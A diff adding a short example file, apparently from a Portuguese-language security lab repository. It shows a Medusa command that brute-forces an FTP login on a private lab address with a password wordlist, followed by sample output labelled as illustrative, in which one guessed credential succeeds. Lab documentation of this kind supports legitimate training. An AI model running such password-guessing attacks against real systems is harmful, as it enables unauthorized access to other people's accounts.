@@ -1,0 +1,8 @@
+# Exemplo de saída do Medusa (adaptar conforme execução real)
+# medusa -h 192.168.56.102 -u ftpuser -P wordlists/pass.txt -M ftp
+
+[22:11:01] 192.168.56.102:21 ftp - SUCCESS: ftpuser:letmein
+[22:11:02] 192.168.56.102:21 ftp - ERROR: Authentication failed for ftpuser:123456
+[22:11:03] 192.168.56.102:21 ftp - ERROR: Authentication failed for ftpuser:password
+...
+# Salve este output para evidência real quando executar no seu lab.
